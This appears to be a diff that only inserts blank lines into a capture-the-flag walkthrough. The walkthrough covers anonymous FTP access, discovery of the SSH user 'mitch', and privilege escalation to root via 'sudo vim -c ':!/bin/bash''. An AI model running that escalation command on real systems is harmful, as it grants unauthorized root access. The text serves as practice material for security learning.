@@ -23,8 +23,11 @@
 	## login with name: anonymous.
 
 	$$ ls
+	
 	$$ cd pub
+	
 	$$ ls
+	
 	$$ get ForMitch.txt
 
 	## Now we know that the username is 'mitch'(ssh).
@@ -46,6 +49,7 @@
 	==> And we are now logedin.
 
 	$$ ls
+	
 	$$ cat user.txt
 
 	==> G00d j0b, keep up!
@@ -62,6 +66,7 @@
 6. Escalate your privilege using 'vim'.
 
 	$$ sudo vim -c ':!/bin/bash'
+	
 	$$ id 
 
 	==> uid=0(root) gid=0(root) groups=0(root)
